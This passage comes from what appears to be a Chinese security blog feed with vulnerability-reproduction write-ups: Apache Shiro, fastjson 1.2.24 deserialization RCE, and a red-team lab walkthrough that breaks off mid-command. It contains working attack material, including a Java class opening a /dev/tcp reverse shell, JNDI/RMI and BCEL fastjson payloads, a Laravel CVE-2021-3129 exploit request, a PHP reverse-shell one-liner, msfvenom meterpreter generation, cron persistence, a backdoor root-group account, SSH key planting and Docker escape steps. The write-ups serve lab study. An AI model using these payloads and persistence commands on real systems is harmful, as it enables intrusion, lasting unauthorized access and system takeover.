AES-128-CBC 模式加密的rememberMe字段存在问题，用户可通过Padding Oracle 加密生成的攻击代码来构造恶意的rememberMe字段，并重新请求网站，进行反序列化攻击，最终导致任意代码执行。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;背景&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#背景&quot;&gt;&lt;/a&gt; 背景&lt;/h1&gt;
&lt;p&gt;&lt;strong&gt;漏洞编号：&lt;/strong&gt; CVE-2016-4437&lt;/p&gt;
&lt;p&gt;Apache Shiro框架提供了记住密码的功能（Rem</summary>
      
    
    
    
    <category term="漏洞复现" scheme="https://j3f5.github.io/categories/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
    
    
  </entry>
  
  <entry>
    <title>fastjson复现</title>
    <link href="https://j3f5.github.io/articles/2023/07/18/fastjson%E5%A4%8D%E7%8E%B0/"/>
    <id>https://j3f5.github.io/articles/2023/07/18/fastjson%E5%A4%8D%E7%8E%B0/</id>
    <published>2023-07-18T12:03:44.000Z</published>
    <updated>2023-07-18T12:03:44.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="背景"><a class="markdownIt-Anchor" href="#背景"></a> 背景</h1><p><a href="https://blog.csdn.net/Bossfrank/article/details/130100893">https://blog.csdn.net/Bossfrank/article/details/130100893</a></p><p><a href="https://vulhub.org/#/environments/fastjson/1.2.24-rce/">https://vulhub.org/#/environments/fastjson/1.2.24-rce/</a></p><p>依照上面的注解，我也尝试说一遍。</p><p>fastjson 1.2.4 rce 是通过反序列化实现的。fastjson提供一个能够将json反序列化成对象的功能，当然也有序列化啦。但是一般序列化与反序列化使用的是<code>setter/getter</code>，还有一种是<code>AutoType</code>。</p><ol><li><p>第一种：当A与B同时是接口C的实现，如果通过这种方法序列化，则会有：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;C&quot;:&#123;&quot;price&quot;:0.5&#125;&#125;</span><br><span class="line">&#123;&quot;C&quot;:&#123;&quot;price&quot;:0.5&#125;&#125;</span><br></pre></td></tr></table></figure><p>此时反序列化后分不清是A还是B</p></li><li><p><code>AutoType</code>在当中加入<code>@type</code>标识类对象：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#123; &quot;C&quot;:&#123; &quot;@type&quot;:&quot;com.hollis.lab.fastjson.test.A&quot;, &quot;price&quot;:0.5 &#125; &#125;</span><br><span class="line">&#123; &quot;C&quot;:&#123; &quot;@type&quot;:&quot;com.hollis.lab.fastjson.test.B&quot;, &quot;price&quot;:5000 &#125; &#125;</span><br></pre></td></tr></table></figure><p>则反序列化后可以实现分清AB</p></li></ol><h2 id="漏洞来源"><a class="markdownIt-Anchor" href="#漏洞来源"></a> 漏洞来源</h2><p>使用<code>AutoType</code>功能进行序列号的JSON字符会带有一个<code>@type</code>来标记其字符的原始类型，在反序列化的时候会读取这个<code>@type</code>，来试图把JSON内容反序列化到对象，并且会调用这个库的<code>setter</code>或者<code>getter</code>方法，然而，<strong><code>@type</code>的类有可能被恶意构造</strong>，只需要合理构造一个JSON，使用<code>@type</code>指定一个想要的攻击类库就可以实现攻击。</p><p>常见的有sun官方提供的一个类<code>com.sun.rowset.JdbcRowSetImpl</code>，其中有个<code>dataSourceName</code>方法支持传入一个<code>rmi</code>的源，只要解析其中的<code>url</code>就会支持远程调用！</p><h2 id="流程"><a class="markdownIt-Anchor" href="#流程"></a> 流程</h2><p><a href="https://juejin.cn/s/fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E4%B8%8D%E5%87%BA%E7%BD%91%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F">参考文章</a>~一共有三种构造payload的方式，分别为：</p><ol><li><p>基于JNDI注入【com.sun.rowset.JdbcRowSetImpl】</p><ol><li>编写恶意java代码，制作恶意class，并放在服务器A中</li><li>在B服务器开启RMI服务（目录），指定服务器A为服务器</li><li>制造rmi请求（该请求为获取一个恶意类），传入受害主机C，主机C则会请求B获得恶意类，B请求A中的恶意类并传入C中，C执行</li></ol><p>如果该恶意类为反弹shell，即可执行shell</p></li><li><p>基于ClassLoader</p></li><li><p>基于TemplatesImpl</p></li></ol><p>实践参考：<a href="https://cloud.tencent.com/developer/article/1785575">https://cloud.tencent.com/developer/article/1785575</a></p><h1 id="jndi注入需要出网"><a class="markdownIt-Anchor" href="#jndi注入需要出网"></a> JNDI注入（需要出网）</h1><h2 id="条件"><a class="markdownIt-Anchor" href="#条件"></a> 条件</h2><p>主机：192.168.52.1</p><p>受害主机：192.168.52.128</p><p>反弹shell接收主机：192.168.52.129</p><ul><li>受害主机能够出网</li></ul><h2 id="准备恶意代码"><a class="markdownIt-Anchor" href="#准备恶意代码"></a> 准备恶意代码</h2><p>主机准备</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">// javac TouchFile.java</span><br><span class="line">import java.lang.Runtime;</span><br><span class="line">import java.lang.Process;</span><br><span class="line"></span><br><span class="line">public class evil&#123;</span><br><span class="line">    static &#123;</span><br><span class="line">        try &#123;</span><br><span class="line">            Runtime rt = Runtime.getRuntime();</span><br><span class="line">            String[] commands = &#123;&quot;/bin/bash&quot;,&quot;-c&quot;,&quot;bash -i &gt;&amp; /dev/tcp/192.168.52.129/7777 0&gt;&amp;1&quot;&#125;;</span><br><span class="line">            Process pc = rt.exec(commands);</span><br><span class="line">            pc.waitFor();</span><br><span class="line">        &#125; catch (Exception e) &#123;</span><br><span class="line">            // do nothing</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>通过<code>javac evil.java</code>完成编译。注意版本为java8</p><p>挂在http服务器目录下，这里使用phpstudy搭建</p><h2 id="运行rmi服务"><a class="markdownIt-Anchor" href="#运行rmi服务"></a> 运行RMI服务</h2><p>主机准备</p><p>下载<a href="https://github.com/mbechler/marshalsec%EF%BC%8C%E5%B9%B6%E4%B8%94%E6%9E%84%E5%BB%BA%E4%BB%A3%E7%A0%81%EF%BC%9A">https://github.com/mbechler/marshalsec，并且构建代码：</a></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mvn clean package -DskipTests</span><br></pre></td></tr></table></figure><blockquote><p>IDEA自带maven，所以可以将它加入到环境变量中</p></blockquote><p>然后进入<code>target</code>目录，运行：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PS D:\Tmp\marshalsec\target&gt; java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.RMIRefServer &quot;http://192.168.52.1/#evil&quot; 9999</span><br></pre></td></tr></table></figure><p><img src="/images/fastjson%E5%A4%8D%E7%8E%B0/2e846ae469d8f1e5d2630296bb3aecc.png" alt="2e846ae469d8f1e5d2630296bb3aecc" /></p><h2 id="执行payload"><a class="markdownIt-Anchor" href="#执行payload"></a> 执行payload</h2><p>burpsuite请求抓包，或者直接使用apipost也行。构建成如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">POST / HTTP/1.1</span><br><span class="line">Host: 192.168.52.128:8090</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept: */*</span><br><span class="line">Accept-Language: en</span><br><span class="line">User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)</span><br><span class="line">Connection: close</span><br><span class="line">Content-Type: application/json</span><br><span class="line">Content-Length: 157</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">    &quot;b&quot;:&#123;</span><br><span class="line">        &quot;@type&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;,</span><br><span class="line">        &quot;dataSourceName&quot;:&quot;rmi://192.168.52.1:9999/evil&quot;,</span><br><span class="line">        &quot;autoCommit&quot;:true</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>执行返回，如果是nc则没有什么返回。</p><p><img src="/images/fastjson%E5%A4%8D%E7%8E%B0/849d2a1e82c779c4d9875982f495b8b.png" alt="849d2a1e82c779c4d9875982f495b8b" /></p><h2 id="效果"><a class="markdownIt-Anchor" href="#效果"></a> 效果</h2><p>创建目录：</p><p><img src="/images/fastjson%E5%A4%8D%E7%8E%B0/9940b1b431f5104bb1a36abf39e2a92.png" alt="9940b1b431f5104bb1a36abf39e2a92" /></p><p>反弹shell</p><p><img src="/images/fastjson%E5%A4%8D%E7%8E%B0/5277062e21f0a0b70f6dfae1a3b314b.png" alt="5277062e21f0a0b70f6dfae1a3b314b" /></p><h1 id="classloaderbcel"><a class="markdownIt-Anchor" href="#classloaderbcel"></a> ClassLoader（BCEL）</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">package org.example;</span><br><span class="line"></span><br><span class="line">import com.alibaba.fastjson.JSON;</span><br><span class="line"></span><br><span class="line">/**</span><br><span class="line"> * @Author kilo、冰室/ki10Moc</span><br><span class="line"> * @date 2022/11/7</span><br><span class="line"> * @time 14:30</span><br><span class="line"> * @blog http://ki10.top</span><br><span class="line"> **/</span><br><span class="line"></span><br><span class="line">public class FastJsonBcel &#123;</span><br><span class="line">    public static void main(String[] args)&#123;</span><br><span class="line">        String payload2 = &quot;&#123;\n&quot; +</span><br><span class="line">                &quot;    &#123;\n&quot; +</span><br><span class="line">                &quot;        \&quot;ki10\&quot;:&#123;\n&quot; +</span><br><span class="line">                &quot;                \&quot;@type\&quot;: \&quot;org.apache.tomcat.dbcp.dbcp2.BasicDataSource\&quot;,\n&quot; +</span><br><span class="line">                &quot;                \&quot;driverClassLoader\&quot;: &#123;\n&quot; +</span><br><span class="line">                &quot;                    \&quot;@type\&quot;: \&quot;com.sun.org.apache.bcel.internal.util.ClassLoader\&quot;\n&quot; +</span><br><span class="line">                &quot;                &#125;,\n&quot; +</span><br><span class="line">                &quot;                \&quot;driverClassName\&quot;: \&quot;$$BCEL$$$l$8b$I$A$A$A$A$A$A$AuQ$cbN$db$40$U$3d$938$b1c$9c$e6A$D$94$a6o$k$81E$zPw$m6$V$95$aa$baM$d5$m$ba$9eL$a7a$82cG$f6$84$a6_$c4$3a$hZ$b1$e8$H$f0Q$88$3b$sM$pAG$f2$7d$ce9$f7$dc$f1$d5$f5$e5$l$Ao$b0$e1$c2$c1$b2$8b$V$3cr$b0j$fcc$hM$X$F$3c$b1$f1$d4$c63$86$e2$be$8a$94$3e$60$c8$b7$b6$8e$Z$ac$b7$f17$c9P$JT$q$3f$8d$G$5d$99$i$f1nH$95z$Q$L$k$k$f3D$99$7cZ$b4$f4$89J$Z$9a$81$88$H$fep$87$ff$dc$fd$a1$o$ff$3bOu$3f$8d$p$ff$f0L$85$7b$M$ce$be$I$a7C$Y$81$gA$9f$9fq_$c5$fe$fb$f6$e1X$c8$a1VqD$d7$ca$j$cd$c5$e9G$3e$cc$c8I$t$83$db$89G$89$90$ef$94$ZV2t$af$N$d6C$J$ae$8d$e7$k$5e$e0$r$a9$ma$c2$c3$x$ac1$y$de$c3$eda$j$$$c3$ea$ffE2T3$5c$c8$a3$9e$df$ee$f6$a5$d0$M$b5$7f$a5$_$a3H$ab$Bip$7bR$cf$92Fk$x$b8s$87$W$b1$e4X$K$86$cd$d6$5c$b7$a3$T$V$f5$f6$e6$B$9f$93X$c84$r$40eHM$9d$ad$7f$94p$ni$z$9b$7e$9c990$b3$y$d9$F$ca$7c$f2$8c$7ca$fb$X$d8$qk$7bd$8b$b7E$94$c9z$d3$f8$B$w$e4$jTg$60$9e$91$B$f5$df$c8$d5$f3$X$b0$be$9e$c3$f9$b0$7d$81$e2$q$ab$97$I$5b$40$3ec$5c$a2$c8$a0K$844$af$5d$s$96$gE$7f$t$94aQ$5e$a7l$91$3e$h$b9$c0$c6C$8b$g$8dL$d4$d2$N_$9f$94$o$82$C$A$A\&quot;\n&quot; +</span><br><span class="line">                &quot;        &#125;\n&quot; +</span><br><span class="line">                &quot;    &#125;: \&quot;Moc\&quot;\n&quot; +</span><br><span class="line">                &quot;&#125;&quot;;</span><br><span class="line">        JSON.parse(payload2);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="templatesimpl"><a class="markdownIt-Anchor" href="#templatesimpl"></a> TemplatesImpl</h1>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;背景&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#背景&quot;&gt;&lt;/a&gt; 背景&lt;/h1&gt;
&lt;p&gt;&lt;a href=&quot;https://blog.csdn.net/Bossfrank/article/details/130100893&quot;&gt;http</summary>
      
    
    
    
    <category term="漏洞复现" scheme="https://j3f5.github.io/categories/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
    
    
  </entry>
  
  <entry>
    <title>红队靶场-7</title>
    <link href="https://j3f5.github.io/articles/2023/07/13/%E7%BA%A2%E9%98%9F%E9%9D%B6%E5%9C%BA-7/"/>
    <id>https://j3f5.github.io/articles/2023/07/13/%E7%BA%A2%E9%98%9F%E9%9D%B6%E5%9C%BA-7/</id>
    <published>2023-07-13T12:49:46.000Z</published>
    <updated>2023-07-13T12:49:46.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="基础环境设置"><a class="markdownIt-Anchor" href="#基础环境设置"></a> 基础环境设置</h1><p>192.168.95.143</p><p><a href="https://www.cnblogs.com/9eek/p/16703300.html">https://www.cnblogs.com/9eek/p/16703300.html</a></p><h1 id="ubuntu1-web1"><a class="markdownIt-Anchor" href="#ubuntu1-web1"></a> Ubuntu1 web1</h1><h2 id="信息搜集"><a class="markdownIt-Anchor" href="#信息搜集"></a> 信息搜集</h2><p>开启端口： 22 ssh/ 80 81 laravel / 6379 redis2.8.17 / os linux4.15-5.8</p><h2 id="攻击laravel"><a class="markdownIt-Anchor" href="#攻击laravel"></a> 攻击Laravel</h2><p>扫描发现80 81 6379端口，访问80端口发现是Nginx代理到81端口了，访问81端口，发现Laravel PHP框架，存在漏洞：CVE-2021-3129 Laravel Debug mode 远程代码执行漏洞。<a href="https://blog.csdn.net/weixin_46944519/article/details/123241080">https://blog.csdn.net/weixin_46944519/article/details/123241080</a></p><p>验证：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">POST /_ignition/execute-solution HTTP/1.1</span><br><span class="line">Host: 192.168.95.52:81</span><br><span class="line">Cache-Control: max-age=0</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.125 Safari/537.36</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: en-US,en;q=0.9</span><br><span class="line">Cookie: XSRF-TOKEN=eyJpdiI6IlppM3EyQjJ6U0htNkozTUNzOC9qZHc9PSIsInZhbHVlIjoicEt2bG9zbXNoSnUvb3BpTERlWGgvQ25OTHVHY2pzckFBdVZzd0JJbjd4RStUdUw5dEFrOFR2SzBQVVYzSXEvMGErLzRlWWN3NEs1cENSMmxQTTA1bEhoVW1NUkUyVDZuZFpvMytRaVkrVFQ4Tnhqc1ZKT1RxbmdLbVE1M2drM0wiLCJtYWMiOiIzNGRiNWFjYzE1YzE4MWMwNDA1Zjc1MWU1MzI4NjNkZjNmZTU2MzhkYzAzMWMxYTE2YTY3YjMzMTNlNGQ5MjBiIn0%3D; laravel_session=eyJpdiI6IkFYSytHN1VMbndGSlp4OXRMMDZaU1E9PSIsInZhbHVlIjoiVGZ5VGVMMklKRTVmWGlrVUl5WlkrNFptNXpCQTNCWmtpdlprWExiQUVsZVpWL0lwdzZKaXJCQ2NSTnBXV3A3T0E3WFpncHhnV05kZ3NSNUx6TFhEQ2xnYkxacXlNN2ZVSXJZZTMvVG9kaHhqRmYySVRFc0NMSlhRUnQ5V21PdDIiLCJtYWMiOiI3MTgwNTUxYjkxNDFjNzczNWYwMjRkMzg1NWVmNDc2NGIzYTc5ZGM0MmRkNWQ3M2ZjYzJjOGM3NTBjNzU4M2FlIn0%3D</span><br><span class="line">Content-Type: application/json</span><br><span class="line">Content-Length: 168</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">  &quot;solution&quot;: &quot;Facade\\Ignition\\Solutions\\MakeViewVariableOptionalSolution&quot;,</span><br><span class="line">  &quot;parameters&quot;: &#123;</span><br><span class="line">    &quot;variableName&quot;: &quot;username&quot;,</span><br><span class="line">    &quot;viewFile&quot;: &quot;index&quot;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>使用EXP：<a href="https://github.com/SecPros-Team/laravel-CVE-2021-3129-EXP%EF%BC%8C%E5%BE%97%E5%88%B0webshell">https://github.com/SecPros-Team/laravel-CVE-2021-3129-EXP，得到webshell</a></p><p>使用EXP：<a href="https://github.com/ajisai-babu/CVE-2021-3129-exp%EF%BC%8C%E5%BE%97%E5%88%B0webshell%EF%BC%88%E8%9A%81%E5%89%91%EF%BC%89">https://github.com/ajisai-babu/CVE-2021-3129-exp，得到webshell（蚁剑）</a></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">使用上面的exp，他要用哥斯拉，我硬是连不上，绝了</span><br><span class="line">webshell地址:http://192.168.95.52:81/fuckyou.php,密码:pass</span><br><span class="line">使用另外的EXP</span><br><span class="line">[OK] 成功写入webshell, 访问地址 http://10.131.210.214:81/shell.php , 密码 whoami</span><br></pre></td></tr></table></figure><p>发现目录：</p><p><img src="/images/%E7%BA%A2%E9%98%9F%E9%9D%B6%E5%9C%BA-7/image-20230714093124402.png" alt="image-20230714093124402" /></p><p>上传linenum搜集信息，发现</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"># 另一个网段</span><br><span class="line">nameserver 192.168.52.2</span><br><span class="line"># Sudo version 可以进行sudo提权（&lt;1.8.28）</span><br><span class="line">Sudo version 1.8.27</span><br><span class="line"># 安装的程序</span><br><span class="line">/usr/bin/gcc</span><br></pre></td></tr></table></figure><p>更看到一个SUID，名字叫shell，看到源码，执行一下发现，不知道可不可以进行环境变量提权，看条件，他没有出现<code>.</code>这个字符，</p><p><img src="/images/%E7%BA%A2%E9%98%9F%E9%9D%B6%E5%9C%BA-7/image-20230714095845843.png" alt="image-20230714095845843" /></p><p>去看看任务：</p><p><img src="/images/%E7%BA%A2%E9%98%9F%E9%9D%B6%E5%9C%BA-7/image-20230714100122687.png" alt="image-20230714100122687" /></p><p>完全没发现，我们是在一个docker里面：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"> Hostname:</span><br><span class="line">8e172820ac78</span><br></pre></td></tr></table></figure><p><img src="/images/%E7%BA%A2%E9%98%9F%E9%9D%B6%E5%9C%BA-7/image-20230714104612542.png" alt="image-20230714104612542" /></p><p>看来现在首先要做的就是docker逃逸了，但是得先提权，sudo和suid环境变量提权都是可以的</p><h2 id="提权"><a class="markdownIt-Anchor" href="#提权"></a> 提权</h2><p><img src="/images/%E7%BA%A2%E9%98%9F%E9%9D%B6%E5%9C%BA-7/image-20230714111147194.png" alt="image-20230714111147194" /></p><p>反弹个shell，用msf接管：<code>system('bash -c &quot;bash -i &gt;&amp; /dev/tcp/10.131.210.172/4444 0&gt;&amp;1&quot;');</code></p><h3 id="suid环境变量提权"><a class="markdownIt-Anchor" href="#suid环境变量提权"></a> SUID+环境变量提权</h3><p><img src="/images/%E7%BA%A2%E9%98%9F%E9%9D%B6%E5%9C%BA-7/image-20230714111401102.png" alt="image-20230714111401102" /></p><p><img src="/images/%E7%BA%A2%E9%98%9F%E9%9D%B6%E5%9C%BA-7/image-20230714111503937.png" alt="image-20230714111503937" /></p><blockquote><p>坑点：在蚁剑的webshell终端里，执行这个PATH没用。还有我以为只有当<code>$PATH</code>里面有<code>.</code>才能算有利用的可能，其实不是的，最重要是有可以以root执行系统命令的二进制文件，然后通过环境变量替换执行的系统命令。把我们伪造的命令PATH放到最前面，先解析。</p></blockquote><p>生成msf木马，由meterpreter接管。即权限维持，这里有多种方式</p><ol><li><p>计划任务</p><p>生成msfvenom木马，上传：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=10.131.210.172 LPORT=4545 -f elf &gt; shell.elf</span><br></pre></td></tr></table></figure><p><img src="/images/%E7%BA%A2%E9%98%9F%E9%9D%B6%E5%9C%BA-7/image-20230714114410437.png" alt="image-20230714114410437" /></p><p>执行：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(crontab -l;echo &#x27;*/1 * * * * /bin/bash /tmp/shell.elf;/bin/bash --noprofile -i&#x27;)|crontab -</span><br></pre></td></tr></table></figure><p>但是没有，所以就放到这把：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">#这几个路径都可以存放cron执行脚本,对应的时间不同</span><br><span class="line">/etc/cron.d/ /etc/cron.daily/ /etc/cron.weekly/ /etc/cron.hourly/ /etc/cron.monthly/ </span><br></pre></td></tr></table></figure><p><img src="/images/%E7%BA%A2%E9%98%9F%E9%9D%B6%E5%9C%BA-7/image-20230714131934378.png" alt="image-20230714131934378" /></p></li><li><p>启动项</p></li><li><p>添加用户</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">useradd jeff</span><br><span class="line">passwd jjj</span><br><span class="line">usermod -aG root jeff</span><br><span class="line">#检查</span><br><span class="line">groups jeff</span><br></pre></td></tr></table></figure></li><li><p>公私钥</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">ssh-keygen -t rsa //生成公钥</span><br><span class="line">echo id_rsa.pub &gt;&gt; .ssh/authorized_keys  //将id_rsa.pub内容放到目标.ssh/authorized_keys里</span><br><span class="line"></span><br><span class="line">echo read_team_rsa.pub &gt;&gt; ~/.ssh/authorized_keys</span><br></pre></td></tr></table></figure></li><li><p>改密码</p><p><img src="/images/%E7%BA%A2%E9%98%9F%E9%9D%B6%E5%9C%BA-7/image-20230714113900832.png" alt="image-20230714113900832" /></p></li></ol><p>因为是docker，所以，ssh没用，crontab没用也差不多</p><h3 id="sudo提权"><a class="markdownIt-Anchor" href="#sudo提权"></a> sudo提权</h3><p>它竟然有好多个版本，但是都没有成功：</p><h4 id="cve-2021-3156"><a class="markdownIt-Anchor" href="#cve-2021-3156"></a> CVE-2021-3156</h4><p><img src="/images/%E7%BA%A2%E9%98%9F%E9%9D%B6%E5%9C%BA-7/image-20230714133329073.png" alt="image-20230714133329073" /></p><h4 id="cve-2023-22809"><a class="markdownIt-Anchor" href="#cve-2023-22809"></a> <a href="https://blog.csdn.net/weixin_46944519/article/details/129971508">CVE-2023-22809</a></h4><p><img src="/images/%E7%BA%A2%E9%98%9F%E9%9D%B6%E5%9C%BA-7/image-20230714133643490.png" alt="image-20230714133643490" /></p><p><a href="https://github.com/n3m1dotsys/CVE-2023-22809-sudoedit-privesc">https://github.com/n3m1dotsys/CVE-2023-22809-sudoedit-privesc</a></p><h2 id="docker逃逸"><a class="markdownIt-Anchor" href="#docker逃逸"></a> docker逃逸</h2><p>发现目录存在：<code>.dockerenv</code>的时候就说明我们在docker里面了，也可以查看<code>cat /proc/1/cgroup</code></p><p>参考：<a href="https://blog.csdn.net/qq_41874930/article/details/109216506">https://blog.csdn.net/qq_41874930/article/details/109216506</a></p><ol><li>利用dirty cow来进行docker逃逸</li><li>cve-2019-5736</li><li>docker配置不当</li></ol><p>总的来说，docker逃逸大部分原因都是配置出现的错误，导致能够在docker机里面直接修改宿主机的一些文件，包括挂载了socket、procfs、/等，只有少部分是由于内核漏洞导致的，所以处理好配置问题，docker逃逸应该挺难。</p><h3 id="脏牛漏洞docker逃逸"><a class="markdownIt-Anchor" href="#脏牛漏洞docker逃逸"></a> 脏牛漏洞docker逃逸</h3><p>脏牛漏洞的成因是get_user_page内核函数在处理Copy-on-Write过程时，可能产生竞态条件，导致<strong>出现了能够写数据到进程空间只读内存区域的机会</strong>。</p><p>linux中存在VDSO小型共享库，能将内核自动映射到用户程序的地址空间，<strong>即将内核函数映射到内存</strong>。</p><p>当linux存在脏牛漏洞时，我们可以利用脏牛漏洞获取到<strong>内存的写权限</strong>，便可以写入shellcode到VDSO中，使得调用正常函数时执行shellcode，进而反弹shell，从而实现dokcer逃逸。</p><p>exp：<a href="https://github.com/scumjr/dirtycow-vdso.git">https://github.com/scumjr/dirtycow-vdso.git</a></p><h3 id="cve-2020-15257逃逸"><a class="markdownIt-Anchor" href="#cve-2020-15257逃逸"></a> CVE-2020-15257逃逸</h3><h3 id="cve-2019-5736"><a class="markdownIt-Anchor" href="#cve-2019-5736"></a> CVE-2019-5736</h3><p>该漏洞（CVE-2019-5736）是2019年爆出的。在Docker 18.09.2之前的版本中使用的runc版本小于1.0-rc6，其允许攻击者重写宿主机上的runc 二进制文件，攻击者可以在宿主机上以root身份执行命令。</p><p>利用该漏洞需要满足以下两个条件之一：</p><blockquote><p>由一个攻击者控制的恶意镜像创建</p><p>攻击者具有某已存在容器的写权限，且可通过docker exec进入。</p></blockquote><p>参考：<a href="https://blog.csdn.net/qq_41874930/article/details/109216506">https://blog.csdn.net/qq_41874930/article/details/109216506</a></p><p><strong>注意！docker需要重启才能出发漏洞，怎么说都有点鸡肋。</strong></p><h3 id="docker配置不当"><a class="markdownIt-Anchor" href="#docker配置不当"></a> docker配置不当</h3><h4 id="特权逃逸"><a class="markdownIt-Anchor" href="#特权逃逸"></a> <a href="https://blog.csdn.net/weixin_53090346/article/details/129708068">特权逃逸</a></h4><p>原理十分简单，特权模式使得宿主机磁盘被挂载到了docker的目录，修改docker目录中的/etc/crontab相当于修改了宿主机的/etc/crontab</p><p>应该判断：<strong>判断是否特全模式启动</strong>：<code>cat /proc/self/status | grep Cap</code>。对应掩码为0000003fffffffff</p><p><img src="/images/%E7%BA%A2%E9%98%9F%E9%9D%B6%E5%9C%BA-7/image-20230714144825877.png" alt="image-20230714144825877" /></p><ol><li><p>在docker中创建目录，然后将宿主机的磁盘挂载到新建的目录中</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">fdisk -l</span><br><span class="line"># return</span><br><span class="line">Device     Boot    Start      End  Sectors Size Id Type</span><br><span class="line">/dev/sda1  *        2048 16779263 16777216   8G 83 Linux</span><br><span class="line"></span><br><span class="line">mkdir /jeff</span><br><span class="line">mount /dev/sda1 